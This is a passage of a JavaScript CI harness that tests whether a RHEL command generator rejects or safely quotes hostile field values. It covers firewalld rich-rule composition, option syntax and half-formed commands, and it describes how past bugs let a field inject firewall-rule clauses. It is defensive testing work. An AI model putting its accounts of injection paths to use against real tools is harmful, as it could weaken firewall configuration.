#!/usr/bin/env node
/* hostile_harness.js — CI merge-gate #4 (threat-model-v1 §11 item 4, §12 item 1).
 *
 *   node tests/hostile_harness.js [path/to/template.html|dist/md-code-red_*.html] [--json]
 *
 * Lifts the MCR-ASSEMBLER block verbatim out of the given file and runs every
 * vector in tests/fixtures/hostile-inputs.json against every field type, in
 * both --flag=VALUE and positional shapes, on all four RHEL releases, plus the
 * composed firewalld rich-rule path and the version-gating path.
 *
 * The code under test is the shipped code: qa.py Q18 points this harness at the
 * built artifact, so a difference between template.html and dist/ cannot hide
 * here. Nothing is stubbed, re-implemented, or paraphrased in Python — there is
 * one assembler in this repo and this runs it.
 *
 * Every (field type, vector) pair must land in exactly one of two states:
 *   REJECTED     assembleCommand() returned null.
 *   QUOTED-SAFE  the value occurs in the command only inside single quotes, the
 *                unquoted skeleton equals the benign command's skeleton, and
 *                the unquoted remainder holds no shell metacharacter.
 * Anything else is a FAIL and exits non-zero.
 *
 * The harness never executes /bin/sh against a vector: proving the quoting by
 * running it would execute attacker text on precisely the build where the
 * quoting is broken. It tokenises instead, under POSIX single-quote rules.
 */
"use strict";

var fs = require("fs");
var path = require("path");

var REPO = path.resolve(__dirname, "..");
var BEGIN = "MCR-ASSEMBLER-BEGIN";
var END = "MCR-ASSEMBLER-END";
var VERSIONS = ["7", "8", "9", "10"];

/* ---------------------------------------------------------------- extraction */

function extractAssembler(file) {
  var src = fs.readFileSync(file, "utf8");
  var a = src.indexOf(BEGIN);
  if (a < 0) throw new Error("no " + BEGIN + " marker in " + file);
  /* Both markers live inside block comments, so the code is what lies between
     the end of the opening comment and the start of the closing one. The END
     marker is searched for AFTER the opening comment closes, because that
     comment's own prose names it. */
  var from = src.indexOf("*/", a);
  if (from < 0) throw new Error("the " + BEGIN + " comment is unterminated in " + file);
  from += 2;
  var b = src.indexOf(END, from);
  if (b < 0) throw new Error("no " + END + " marker after " + BEGIN + " in " + file);
  var to = src.lastIndexOf("/*", b);
  if (to < from) throw new Error("malformed assembler markers in " + file);
  var block = src.slice(from, to);
  /* The block must stay pure. If a DOM or data-island reference ever lands in
     it, this harness would either crash or, worse, quietly test a stub. */
  var banned = ["document", "window.", "localStorage", "sessionStorage",
                "DATASETS", "STATE.", "innerHTML"];
  for (var i = 0; i < banned.length; i++) {
    if (block.indexOf(banned[i]) >= 0) {
      throw new Error("assembler block references '" + banned[i] +
                      "' — it must stay pure, or this gate tests nothing");
    }
  }
  /* MCR-SEC-010. The dead YAML quoter is gone and Q18's quoting-domain check is
     shell-only until the Ansible generator lands. If a YAML sink brings a quoter
     back, its oracle ships in the same commit as the sink — this harness refuses
     to run otherwise, rather than proving shell containment and calling it YAML
     containment (that mistake is MCR-SEC-005b). */
  if (block.indexOf("yamlQuote") >= 0 && block.indexOf("PARSE_YAML_ORACLE") < 0) {
    throw new Error("a YAML quoter is back in the assembler block with no YAML oracle in this " +
                    "harness. MCR-SEC-010: the sink, the quoter and a YAML-parsing oracle ship " +
                    "together or not at all");
  }
  var factory = new Function(
    "\"use strict\";\n" + block + "\n" +
    "return {shQuote:shQuote,validateField:validateField," +
    "validateSpec:validateSpec,assembleCommand:assembleCommand," +
    "composeRichRule:composeRichRule,blastFor:blastFor,FIELD_TYPES:FIELD_TYPES," +
    "RICHRULE_SLOT_TYPES:RICHRULE_SLOT_TYPES,fieldTypeMap:fieldTypeMap," +
    "headerSafe:headerSafe,commentPayload:commentPayload};");
  return { api: factory(), bytes: block.length };
}

/* --------------------------------------------------------------- tokenising */

/* A POSIX-ish word splitter, which is what a shell would do with this string.
   Single quotes protect everything until the next quote; outside them a
   backslash escapes exactly one character (shQuote's embedded-quote idiom
   'a'\''b' is one word: quoted, escaped-quote, quoted). Each word records the
   text a shell would still interpret — the part NOT protected by quotes and
   NOT backslash-escaped — which is the only text an injected value could ever
   act through. */
function tokenize(cmd) {
  var words = [], cur = "", bare = "", deq = "", quoted = false, started = false, inQ = false, i = 0;
  function flush() {
    if (started) words.push({ raw: cur, bare: bare, deq: deq, quoted: quoted });
    cur = ""; bare = ""; deq = ""; quoted = false; started = false;
  }
  while (i < cmd.length) {
    var c = cmd.charAt(i);
    if (inQ) {
      cur += c;
      if (c === "'") inQ = false; else deq += c;
      i++; started = true; continue;
    }
    if (c === "\\") {
      if (i + 1 >= cmd.length) return null;      /* trailing backslash: malformed */
      cur += c + cmd.charAt(i + 1);
      deq += cmd.charAt(i + 1);
      i += 2; started = true; continue;          /* escaped char is inert, not 'bare' */
    }
    if (c === "'") { inQ = true; quoted = true; cur += c; i++; started = true; continue; }
    if (c === " " || c === "\t") { flush(); i++; continue; }
    if (c === "\n" || c === "\r") return null;   /* a raw newline is never legitimate here */
    cur += c; bare += c; deq += c; i++; started = true;
  }
  if (inQ) return null;                          /* unbalanced quote: quoting is broken */
  flush();
  return words;
}

/* ------------------------------------------------- the rich-rule oracle -----
 * MCR-SEC-005(b). tokenize()/skeleton() prove SHELL-token containment and
 * nothing else: a value can sit perfectly inside one single-quoted shell word
 * and still rewrite the grammar of whatever consumes that word. firewalld's
 * rich-rule language is that consumer, so it gets its own parser here.
 *
 * parseRichRule() is deliberately strict — every token is either an element
 * name or a key="value" attribute with no quote inside the value. Anything else
 * is injected syntax and returns null rather than being tolerated.
 */
function parseRichRule(s) {
  var toks = String(s).split(" ");
  if (toks.length < 2 || toks[0] !== "rule") return null;
  var els = [{ name: "rule", attrs: [] }], action = null, i;
  for (i = 1; i < toks.length; i++) {
    var t = toks[i];
    if (/^[a-z][a-z0-9-]*$/.test(t)) {
      if (i === toks.length - 1) { action = t; break; }
      els.push({ name: t, attrs: [] });
      continue;
    }
    var m = /^([a-z][a-z0-9-]*)="([^"\s]*)"$/.exec(t);
    if (!m) return null;
    els[els.length - 1].attrs.push([m[1], m[2]]);
  }
  if (action === null) return null;
  return { elements: els, action: action };
}

/* What the OPERATOR asked for, derived from the plan and the values they chose —
 * the intent the composed rule must equal, element for element, in order. */
function intendedRichRule(plan, values) {
  var els = [{ name: "rule", attrs: [["family", values[plan.family]]] }];
  if (plan.source && values[plan.source] !== undefined) {
    els.push({ name: "source", attrs: [["address", values[plan.source]]] });
  }
  if (plan.destination && values[plan.destination] !== undefined) {
    els.push({ name: "destination", attrs: [["address", values[plan.destination]]] });
  }
  if (plan.service && values[plan.service] !== undefined) {
    els.push({ name: "service", attrs: [["name", values[plan.service]]] });
  }
  if (plan.port && values[plan.port] !== undefined) {
    els.push({ name: "port", attrs: [["port", values[plan.port]], ["protocol", values[plan.protocol]]] });
  }
  return { elements: els, action: values[plan.action] };
}

function describeRule(r) {
  var out = [], i, j;
  for (i = 0; i < r.elements.length; i++) {
    var e = r.elements[i], bits = [];
    for (j = 0; j < e.attrs.length; j++) bits.push(e.attrs[j][0] + "=" + e.attrs[j][1]);
    out.push(e.name + "(" + bits.join(",") + ")");
  }
  return out.join(" ") + " -> " + r.action;
}

/* The oracle proper: lift the composed rule back out of the assembled command,
 * parse it, and assert the element count, the element order, every attribute and
 * the ACTION are exactly the operator's intent. An injected `accept` clause or a
 * `log` element changes the count; a swapped action changes the action. */
function richRuleOracle(command, plan, values) {
  var words = tokenize(command);
  if (words === null) return "the command does not tokenise as balanced shell words";
  var payload = null, i;
  for (i = 0; i < words.length; i++) {
    if (words[i].deq.indexOf("--add-rich-rule=") === 0) {
      payload = words[i].deq.slice("--add-rich-rule=".length);
    }
  }
  if (payload === null) return "no --add-rich-rule= token in the assembled command";
  var got = parseRichRule(payload);
  if (got === null) return "the composed rich rule does not parse as rich-rule syntax: " + JSON.stringify(payload);
  var want = intendedRichRule(plan, values);
  if (got.elements.length !== want.elements.length) {
    return "rich-rule element count " + got.elements.length + " != the operator's " +
           want.elements.length + " — " + describeRule(got) + " vs " + describeRule(want);
  }
  for (i = 0; i < want.elements.length; i++) {
    var g = got.elements[i], w = want.elements[i];
    if (g.name !== w.name) {
      return "rich-rule element " + i + " is '" + g.name + "', the operator's is '" + w.name + "'";
    }
    if (g.attrs.length !== w.attrs.length) {
      return "rich-rule element '" + g.name + "' carries " + g.attrs.length + " attributes, the " +
             "operator's carries " + w.attrs.length + " — " + describeRule(got);
    }
    for (var j = 0; j < w.attrs.length; j++) {
      if (g.attrs[j][0] !== w.attrs[j][0] || g.attrs[j][1] !== String(w.attrs[j][1])) {
        return "rich-rule attribute " + g.attrs[j][0] + "=" + g.attrs[j][1] + " != the operator's " +
               w.attrs[j][0] + "=" + w.attrs[j][1];
      }
    }
  }
  if (got.action !== String(want.action)) {
    return "rich-rule ACTION is '" + got.action + "' but the operator selected '" + want.action +
           "' — the rule installed on the host would not be the rule on screen";
  }
  return null;
}

/* The shape a shell sees: every quoted payload collapses to one placeholder, so
   two commands that differ only INSIDE quotes compare equal, and any value that
   changed the command's structure shows up immediately. */
function skeleton(words) {
  var out = [];
  for (var i = 0; i < words.length; i++) {
    out.push(words[i].quoted ? words[i].bare + "@" : words[i].raw);
  }
  return out.join(" ");
}

function bareText(words) {
  var out = "";
  for (var i = 0; i < words.length; i++) out += words[i].bare + " ";
  return out;
}

var UNQUOTED_OK = /^[A-Za-z0-9_./=:@%+,\- ]*$/;

/* ---------------------------------------------- the VALIDITY oracle --------
 * MCR-SEC-021 / MCR-SEC-015, conditions E1 and E6. Everything above this point
 * is a CONTAINMENT oracle: it proves a hostile value cannot escape its single
 * quotes and cannot change the command's shell-visible shape. It says nothing
 * about whether the shape itself is a legal invocation of the tool — which is
 * precisely how 20 short-option tokens joined with '=' passed 76,225 checks.
 *
 * optionSyntaxErrors() is the general half of the missing oracle: getopt(3)
 * syntax, asserted on every benign command this harness assembles. The specific
 * half is tests/fixtures/golden-commands.json, which states the exact command
 * every generator must emit.
 *
 *   short option (single dash):  -X value   or  -Xvalue   — NEVER -X=value,
 *       because getopt() hands the '=' to the program as optarg[0].
 *   long option  (double dash):  --name=value  or  --name value  — both legal;
 *       this product emits the '=' form, and E1 must not "fix" it away.
 */
var SHORT_OPT_EQ_RE = /^-[A-Za-z0-9][A-Za-z0-9-]*=/;
var LONG_OPT_RE = /^--[A-Za-z0-9][A-Za-z0-9-]*(=|$)/;
var SHORT_OPT_RE = /^-[A-Za-z0-9][A-Za-z0-9-]*$/;

function optionSyntaxErrors(command) {
  var errs = [];
  var words = tokenize(command);
  if (words === null) {
    return ["does not tokenise as balanced shell words"];
  }
  for (var i = 0; i < words.length; i++) {
    var bare = words[i].bare;
    if (bare.charAt(0) !== "-" || bare.length < 2) continue;   /* not option-shaped */
    if (bare === "--") continue;                               /* end-of-options marker */
    if (bare.charAt(1) === "-") {
      if (!LONG_OPT_RE.test(bare)) {
        errs.push("word " + i + " " + JSON.stringify(words[i].raw) +
                  " is double-dashed but is not a long option");
      }
      continue;
    }
    if (SHORT_OPT_EQ_RE.test(bare)) {
      errs.push("word " + i + " " + JSON.stringify(words[i].raw) + " joins a SHORT option to its " +
                "value with '='. getopt(3) passes the '=' through as the first character of the " +
                "argument, so the tool receives a value that is not the one on screen " +
                "(MCR-SEC-015). A short option takes '-X value' or glued '-Xvalue'");
      continue;
    }
    if (!SHORT_OPT_RE.test(bare)) {
      errs.push("word " + i + " " + JSON.stringify(words[i].raw) +
                " is single-dashed but is not a short option token");
    }
  }
  return errs;
}

/* The long options a spec's template binds to a value. E1 removes the '='
   join from SHORT options only; if it also removed it from long ones, every
   firewall-cmd and journalctl generator would still assemble and every
   containment check would still pass. These flags are what proves it did not. */
function longValueFlags(spec) {
  var out = [], t = (spec && spec.template) || [];
  for (var i = 0; i < t.length; i++) {
    var tok = t[i];
    if (!tok || typeof tok.flag !== "string") continue;
    if (tok.flag.indexOf("--") !== 0) continue;
    if (tok.field === undefined && tok.richRule === undefined) continue;   /* bare option */
    if (tok.eq === false) continue;                                        /* declared space-joined */
    out.push(tok.flag);
  }
  return out;
}

/* ------------------------------------------------------------------- specs */

function flagSpec(type, def, versions) {
  var field = { name: "v", type: type, required: true, versions: versions || VERSIONS };
  if (def.options) field.options = def.options;
  return {
    id: "harness-flag-" + type, tool: "harness", blast: "green",
    fields: [field],
    template: [{ lit: "probe" }, { flag: "--value", field: "v" }]
  };
}
function argSpec(type, def, versions) {
  var field = { name: "v", type: type, required: true, versions: versions || VERSIONS };
  if (def.options) field.options = def.options;
  return {
    id: "harness-arg-" + type, tool: "harness", blast: "green",
    fields: [field],
    template: [{ lit: "probe" }, { lit: "--" }, { field: "v" }]
  };
}
function spacedFlagSpec(type, def) {
  var field = { name: "v", type: type, required: true, versions: VERSIONS };
  if (def.options) field.options = def.options;
  return {
    id: "harness-spaced-" + type, tool: "harness", blast: "green",
    fields: [field],
    template: [{ lit: "probe" }, { flag: "--value", eq: false, field: "v" }]
  };
}
/* The highest-risk field class in the threat model: a rich rule whose legitimate
   syntax overlaps shell syntax. Composed from validated sub-fields only.
 *
 * MCR-SEC-005(a). (hostileField, hostileType) substitutes a DIFFERENT field type
 * into one rich-rule slot. Before the fix this function was only ever called as
 * richRuleSpec(null, null), so the substitution never fired and no free-text type
 * was ever placed in a rich-rule slot — which is precisely why MCR-SEC-001
 * survived 15,392 checks. It is now driven with every field type in every slot.
 *
 * `shape` picks the plan: "port" is the port/protocol rule, "service" is the
 * shape from the MCR-SEC-001 reproduction, where a `service` slot fed from a
 * comment-typed field injected a whole `accept` clause.
 */
function richRuleSpec(hostileField, hostileType, defs, shape) {
  var fields, plan;
  if (shape === "service") {
    fields = [
      { name: "family", type: "family", required: true, versions: VERSIONS },
      { name: "source", type: "cidr", required: true, versions: VERSIONS },
      { name: "svc", type: "service", required: true, versions: VERSIONS },
      { name: "act", type: "action", required: true, versions: VERSIONS }
    ];
    plan = { family: "family", source: "source", service: "svc", action: "act" };
  } else {
    fields = [
      { name: "family", type: "family", required: true, versions: VERSIONS },
      { name: "source", type: "cidr", required: true, versions: VERSIONS },
      { name: "port", type: "portrange", required: true, versions: VERSIONS },
      { name: "proto", type: "protocol", required: true, versions: VERSIONS },
      { name: "act", type: "action", required: true, versions: VERSIONS }
    ];
    plan = { family: "family", source: "source", port: "port", protocol: "proto", action: "act" };
  }
  for (var i = 0; i < fields.length; i++) {
    if (fields[i].name === hostileField && hostileType) {
      fields[i].type = hostileType;
      var d = (defs || {})[hostileType] || {};
      if (d.options) fields[i].options = d.options;
      else delete fields[i].options;
    }
  }
  var spec = {
    id: "harness-richrule" + (shape === "service" ? "-service" : ""),
    tool: "firewall-cmd", blast: "green",
    fields: fields,
    template: [
      { lit: "firewall-cmd" },
      { flag: "--add-rich-rule", richRule: plan },
      { lit: "--permanent" }
    ]
  };
  spec._plan = plan;
  return spec;
}

/* The benign value set for each rich-rule shape, per slot field name. */
function richBaseFor(shape) {
  return shape === "service"
    ? { family: "ipv4", source: "10.0.0.0/8", svc: "ssh", act: "accept" }
    : { family: "ipv4", source: "10.0.0.0/8", port: "8443", proto: "tcp", act: "accept" };
}

/* -------------------------------------------------------------------- run */

function main() {
  var target = process.argv[2] || path.join(REPO, "template.html");
  var asJson = process.argv.indexOf("--json") >= 0;
  var loaded = extractAssembler(target);
  var A = loaded.api;
  var fx = JSON.parse(fs.readFileSync(path.join(REPO, "tests", "fixtures", "hostile-inputs.json"), "utf8"));
  var types = Object.keys(fx.field_types);
  var vectors = fx.vectors;

  var stats = { checks: 0, rejected: 0, quoted: 0, oracles: 0, failures: [], byClass: {}, byType: {} };

  function note(cls, outcome) {
    if (!stats.byClass[cls]) stats.byClass[cls] = { rejected: 0, quoted: 0 };
    stats.byClass[cls][outcome]++;
  }

  function check(label, cls, spec, version, values, value, expect) {
    stats.checks++;
    var res;
    try {
      res = A.assembleCommand(spec, version, values, { patterns: [] });
    } catch (e) {
      stats.failures.push(label + ": assembler threw " + e.message);
      return;
    }
    if (res === null) {
      if (expect !== "reject") {
        stats.failures.push(label + ": rejected, but this value is legitimate for this field type " +
                            "and must assemble into a quoted token");
        return;
      }
      stats.rejected++; note(cls, "rejected"); return;
    }
    if (expect === "reject") {
      stats.failures.push(label + ": accepted a value its field type's allow-list must refuse — " +
                          JSON.stringify(res.command) + " (quoting may still hold; the grammar does not)");
      return;
    }
    if (!res || typeof res.command !== "string") {
      stats.failures.push(label + ": returned a non-null result with no command string");
      return;
    }
    var words = tokenize(res.command);
    if (words === null) {
      stats.failures.push(label + ": command does not tokenise as balanced shell words — "
        + JSON.stringify(res.command));
      return;
    }
    /* nothing the shell would still interpret may carry any of the value */
    var bare = bareText(words);
    if (!UNQUOTED_OK.test(bare)) {
      stats.failures.push(label + ": shell metacharacter left unquoted in "
        + JSON.stringify(bare) + " (from " + JSON.stringify(res.command) + ")");
      return;
    }
    if (value !== "" && bare.indexOf(value) >= 0) {
      stats.failures.push(label + ": the value itself reached unquoted text in " + JSON.stringify(res.command));
      return;
    }
    /* the command's shape must be exactly what the benign control produces */
    var benignValues = {}, k;
    for (k in values) if (Object.prototype.hasOwnProperty.call(values, k)) benignValues[k] = values[k];
    benignValues[spec._hostileField] = spec._benign;
    var ref = A.assembleCommand(spec, version, benignValues, { patterns: [] });
    if (ref === null) {
      stats.failures.push(label + ": the benign control value was itself rejected");
      return;
    }
    var refWords = tokenize(ref.command);
    if (refWords === null || skeleton(words) !== skeleton(refWords)) {
      stats.failures.push(label + ": shell-visible shape differs from the benign control — "
        + JSON.stringify(skeleton(words)) + " vs "
        + JSON.stringify(refWords ? skeleton(refWords) : "(control does not tokenise)"));
      return;
    }
    /* MCR-SEC-005(b): shell containment is not rich-rule containment. If this
       spec composes a rich rule, the rule itself gets parsed and compared. */
    if (spec._plan) {
      var oracleMsg = richRuleOracle(res.command, spec._plan, values);
      if (oracleMsg) {
        stats.failures.push(label + ": rich-rule oracle — " + oracleMsg);
        return;
      }
      stats.oracles++;
    }
    stats.quoted++;
    note(cls, "quoted");
  }

  /* ---- every field type x every vector x every version x three shapes ---- */
  for (var t = 0; t < types.length; t++) {
    var type = types[t];
    var def = fx.field_types[type];
    stats.byType[type] = { rejected: 0, quoted: 0 };
    for (var v = 0; v < vectors.length; v++) {
      var vec = vectors[v];
      for (var r = 0; r < VERSIONS.length; r++) {
        var version = VERSIONS[r];
        var shapes = [flagSpec(type, def), argSpec(type, def), spacedFlagSpec(type, def)];
        for (var s = 0; s < shapes.length; s++) {
          var spec = shapes[s];
          spec._hostileField = "v";
          spec._benign = def.benign;
          var before = { r: stats.rejected, q: stats.quoted };
          /* every field type except the one free-text type is a closed grammar,
             so the required outcome there is rejection, full stop. */
          check(spec.id + " / " + vec.id + " / RHEL " + version, vec["class"],
                spec, version, { v: vec.value }, vec.value,
                type === "comment" ? vec.free_text : "reject");
          if (stats.rejected > before.r) stats.byType[type].rejected++;
          else if (stats.quoted > before.q) stats.byType[type].quoted++;
        }
      }
    }
  }

  /* ---- the rich-rule path (MCR-SEC-001 / MCR-SEC-005) --------------------
     Three sweeps, because two different things can go wrong here: a hostile
     VALUE in a legitimate sub-field type, and a hostile TYPE substituted into a
     rich-rule slot by a content author. The second one is what MCR-SEC-001 was:
     the slot allow-list is now the control, and this is the sweep that proves it.
   */
  var RICH_SHAPES = ["port", "service"];
  var richCounts = { native: 0, typed: 0, refusedType: 0, allowedType: 0 };

  function slotOfField(plan, fieldName) {
    for (var s in plan) {
      if (Object.prototype.hasOwnProperty.call(plan, s) && plan[s] === fieldName) return s;
    }
    return null;
  }
  function valuesFrom(base, override, value) {
    var out = {}, k;
    for (k in base) if (Object.prototype.hasOwnProperty.call(base, k)) out[k] = base[k];
    if (override) out[override] = value;
    return out;
  }

  for (var sh = 0; sh < RICH_SHAPES.length; sh++) {
    var shape = RICH_SHAPES[sh];
    var richBase = richBaseFor(shape);
    var richFields = Object.keys(richBase);

    /* (1) native sub-field types, hostile values: every rich-rule sub-field is a
           closed grammar, so nothing hostile may compose. */
    for (var rf = 0; rf < richFields.length; rf++) {
      for (var rv = 0; rv < vectors.length; rv++) {
        for (var rr = 0; rr < VERSIONS.length; rr++) {
          var rspec = richRuleSpec(null, null, fx.field_types, shape);
          rspec._hostileField = richFields[rf];
          rspec._benign = richBase[richFields[rf]];
          richCounts.native++;
          check("richrule-" + shape + "[" + richFields[rf] + "] / " + vectors[rv].id +
                " / RHEL " + VERSIONS[rr], vectors[rv]["class"], rspec, VERSIONS[rr],
                valuesFrom(richBase, richFields[rf], vectors[rv].value), vectors[rv].value, "reject");
        }
      }
    }

    /* (2) hostile TYPE substituted into each slot, benign value for that type.
           A type that is not on the slot's allow-list must yield null even with a
           perfectly valid value — that is the structural rule, not a character
           rule. A type that IS allow-listed must still compose the operator's
           exact rule, which the oracle checks. */
    for (var tf = 0; tf < richFields.length; tf++) {
      var slot = slotOfField(richRuleSpec(null, null, fx.field_types, shape)._plan, richFields[tf]);
      for (var tt = 0; tt < types.length; tt++) {
        var subType = types[tt];
        var allowed = (A.RICHRULE_SLOT_TYPES[slot] || []).indexOf(subType) >= 0;
        for (var tr = 0; tr < VERSIONS.length; tr++) {
          var tspec = richRuleSpec(richFields[tf], subType, fx.field_types, shape);
          var tvals = valuesFrom(richBase, richFields[tf], fx.field_types[subType].benign);
          var label = "richrule-" + shape + "[" + slot + " := " + subType + "] / RHEL " + VERSIONS[tr];
          stats.checks++;
          richCounts.typed++;
          var tres = A.assembleCommand(tspec, VERSIONS[tr], tvals, { patterns: [] });
          if (!allowed) {
            if (tres !== null) {
              stats.failures.push(label + ": a field type that is NOT on this rich-rule slot's " +
                                  "allow-list composed a rule — " + JSON.stringify(tres.command));
            } else {
              stats.rejected++; note("rich-rule slot type", "rejected");
              richCounts.refusedType++;
            }
            continue;
          }
          if (tres === null) {
            stats.failures.push(label + ": an allow-listed closed-grammar type was refused with a " +
                                "benign value — the slot allow-list is too narrow to be usable");
            continue;
          }
          var msg = richRuleOracle(tres.command, tspec._plan, tvals);
          if (msg) {
            stats.failures.push(label + ": rich-rule oracle — " + msg);
            continue;
          }
          stats.quoted++; stats.oracles++; note("rich-rule slot type", "quoted");
          richCounts.allowedType++;
        }
      }
    }

    /* (3) hostile TYPE and hostile VALUE together: the cross product the
           signature was written for. Every case must be refused — either
           structurally (type not allowed in the slot) or by the type's own
           allow-list (every allowed type is a closed grammar). */
    for (var hf = 0; hf < richFields.length; hf++) {
      for (var ht = 0; ht < types.length; ht++) {
        for (var hv = 0; hv < vectors.length; hv++) {
          for (var hr = 0; hr < VERSIONS.length; hr++) {
            var hspec = richRuleSpec(richFields[hf], types[ht], fx.field_types, shape);
            hspec._hostileField = richFields[hf];
            hspec._benign = richBase[richFields[hf]];
            check("richrule-" + shape + "[" + richFields[hf] + " := " + types[ht] + "] / " +
                  vectors[hv].id + " / RHEL " + VERSIONS[hr], vectors[hv]["class"], hspec,
                  VERSIONS[hr], valuesFrom(richBase, richFields[hf], vectors[hv].value),
                  vectors[hv].value, "reject");
          }
        }
      }
    }

    /* (4) benign control for the shape: the rule the operator asked for still
           composes, on every release, and the oracle agrees element for element. */
    for (var br = 0; br < VERSIONS.length; br++) {
      var bspec = richRuleSpec(null, null, fx.field_types, shape);
      stats.checks++;
      var bres = A.assembleCommand(bspec, VERSIONS[br], richBase, { patterns: [] });
      if (bres === null) {
        stats.failures.push("richrule-" + shape + " benign control was rejected on RHEL " + VERSIONS[br]);
        continue;
      }
      var bmsg = richRuleOracle(bres.command, bspec._plan, richBase);
      if (bmsg) {
        stats.failures.push("richrule-" + shape + " benign control / RHEL " + VERSIONS[br] +
                            ": rich-rule oracle — " + bmsg);
        continue;
      }
      stats.quoted++; stats.oracles++; note("rich-rule benign control", "quoted");
    }
  }

  /* ---- MCR-SEC-002: never-half-formed, per TEMPLATE ----------------------
     The rule used to be enforced per FIELD: an optional field that was not
     supplied simply made its token vanish, so a positional argument could shift
     into the slot before it (`chown 'apache' '/var/www'` -> `chown '/var/www'`)
     and a literal that owned a value could be left dangling
     (`--add-forward-port=port=443:proto=tcp:toaddr=` with nothing after it).
     Both reproductions below are Marcus's, kept verbatim as regressions.

     Every template shape gets the absent-optional case, on all four releases:
     positional, trailing positional, --flag=value, --flag value, lit-then-field,
     lit-with-requires, and the version-gated variants of each. `want` is either
     null or the exact command the template must produce. */
  var halfFormed = 0;
  function hfCase(id, spec, values, want) {
    return { id: id, spec: spec, values: values, want: want };
  }
  var F_OWNER = { name: "owner", type: "username", required: false };
  var F_PATH = { name: "p", type: "path", required: true };
  var F_ZONE = { name: "zone", type: "zone", required: true };
  var F_TOADDR = { name: "toaddr", type: "ipv4", required: false };
  var F_MODE = { name: "mode", type: "integer", required: false };
  var FWD_LIT = "--add-forward-port=port=443:proto=tcp:toaddr=";

  var hfCases = [
    /* (a) Marcus's positional-shift reproduction */
    hfCase("chown / optional positional, not declared droppable, value absent",
      { id: "hf-chown", fields: [F_OWNER, F_PATH],
        template: [{ lit: "chown" }, { field: "owner" }, { field: "p" }] },
      { p: "/var/www" }, null),
    hfCase("chown / both positionals supplied (control)",
      { id: "hf-chown", fields: [F_OWNER, F_PATH],
        template: [{ lit: "chown" }, { field: "owner" }, { field: "p" }] },
      { owner: "apache", p: "/var/www" }, "chown 'apache' '/var/www'"),
    hfCase("chown / declared droppable but a later positional is present",
      { id: "hf-chown-declared", fields: [F_OWNER, F_PATH],
        template: [{ lit: "chown" }, { field: "owner", optional: true }, { field: "p" }] },
      { p: "/var/www" }, null),
    hfCase("chown / declared droppable and trailing — the only legal drop",
      { id: "hf-chown-trailing", fields: [F_OWNER, F_PATH],
        template: [{ lit: "chown" }, { field: "p" }, { field: "owner", optional: true }] },
      { p: "/var/www" }, "chown '/var/www'"),

    /* (b) Marcus's dangling-option reproduction, named in threat-model §3.4 */
    hfCase("firewall-cmd / lit owns the value, value absent, nothing declared",
      { id: "hf-fwd", fields: [F_ZONE, F_TOADDR],
        template: [{ lit: "firewall-cmd" }, { flag: "--zone", field: "zone" },
                   { lit: FWD_LIT }, { field: "toaddr" }] },
      { zone: "public" }, null),
    hfCase("firewall-cmd / both supplied (control)",
      { id: "hf-fwd", fields: [F_ZONE, F_TOADDR],
        template: [{ lit: "firewall-cmd" }, { flag: "--zone", field: "zone" },
                   { lit: FWD_LIT }, { field: "toaddr" }] },
      { zone: "public", toaddr: "10.1.1.1" },
      "firewall-cmd --zone='public' " + FWD_LIT + " '10.1.1.1'"),
    hfCase("firewall-cmd / lit declares requires:, so it drops WITH its value",
      { id: "hf-fwd-requires", fields: [F_ZONE, F_TOADDR],
        template: [{ lit: "firewall-cmd" }, { flag: "--zone", field: "zone" },
                   { lit: FWD_LIT, requires: "toaddr" }, { field: "toaddr", optional: true }] },
      { zone: "public" }, "firewall-cmd --zone='public'"),
    hfCase("firewall-cmd / requires: lit keeps its value when supplied",
      { id: "hf-fwd-requires", fields: [F_ZONE, F_TOADDR],
        template: [{ lit: "firewall-cmd" }, { flag: "--zone", field: "zone" },
                   { lit: FWD_LIT, requires: "toaddr" }, { field: "toaddr", optional: true }] },
      { zone: "public", toaddr: "10.1.1.1" },
      "firewall-cmd --zone='public' " + FWD_LIT + " '10.1.1.1'"),
    hfCase("lit requires: a field the spec does not declare",
      { id: "hf-fwd-bad-requires", fields: [F_ZONE],
        template: [{ lit: "firewall-cmd" }, { lit: FWD_LIT, requires: "nosuch" }] },
      { zone: "public" }, null),

    /* (c) MCR-SEC-013, Marcus's re-review reproduction. A conditional POSITIONAL
       literal is the one path the MCR-SEC-002 rule did not cover: isPositional-
       Token() asked `tok.field && !tok.flag`, so a lit was never positional and
       could vanish with a later positional still present — `chmod '/etc/foo'`,
       the path sitting in the mode slot. The rule is the same one field tokens
       obey: drop only if every later positional drops too. */
    hfCase("chmod / conditional positional LIT drops while a later positional stays",
      { id: "hf-chmod-lit", fields: [F_MODE, F_PATH],
        template: [{ lit: "chmod" }, { lit: "0644", requires: "mode" }, { field: "p" }] },
      { p: "/etc/foo" }, null),
    hfCase("chmod / conditional positional LIT with its field supplied (control)",
      { id: "hf-chmod-lit", fields: [F_MODE, F_PATH],
        template: [{ lit: "chmod" }, { lit: "0644", requires: "mode" }, { field: "p" }] },
      { mode: "1", p: "/etc/foo" }, "chmod 0644 '/etc/foo'"),
    hfCase("chmod / conditional LIT is the last positional — the only legal drop",
      { id: "hf-chmod-lit-trailing", fields: [F_MODE, F_PATH],
        template: [{ lit: "chmod" }, { field: "p" }, { lit: "0644", requires: "mode" }] },
      { p: "/etc/foo" }, "chmod '/etc/foo'"),
    hfCase("chmod / conditional LIT last positional, field supplied (control)",
      { id: "hf-chmod-lit-trailing", fields: [F_MODE, F_PATH],
        template: [{ lit: "chmod" }, { field: "p" }, { lit: "0644", requires: "mode" }] },
      { mode: "1", p: "/etc/foo" }, "chmod '/etc/foo' 0644"),

    /* --flag=value and --flag value: name and value live in one token, so the
       drop takes both or neither — but it still has to be declared. */
    hfCase("--flag=value / optional value absent, not declared droppable",
      { id: "hf-flag", fields: [F_OWNER],
        template: [{ lit: "probe" }, { flag: "--owner", field: "owner" }] },
      {}, null),
    hfCase("--flag=value / optional value absent, declared droppable",
      { id: "hf-flag-declared", fields: [F_OWNER],
        template: [{ lit: "probe" }, { flag: "--owner", field: "owner", optional: true }] },
      {}, "probe"),
    hfCase("--flag value / optional value absent, declared droppable",
      { id: "hf-spaced-declared", fields: [F_OWNER],
        template: [{ lit: "probe" }, { flag: "--owner", eq: false, field: "owner", optional: true }] },
      {}, "probe"),
    hfCase("--flag value / optional value absent, not declared droppable",
      { id: "hf-spaced", fields: [F_OWNER],
        template: [{ lit: "probe" }, { flag: "--owner", eq: false, field: "owner" }] },
      {}, null)
  ];

  for (var hc = 0; hc < hfCases.length; hc++) {
    for (var hr2 = 0; hr2 < VERSIONS.length; hr2++) {
      var cs = hfCases[hc];
      halfFormed++;
      var got = A.assembleCommand(cs.spec, VERSIONS[hr2], cs.values, { patterns: [] });
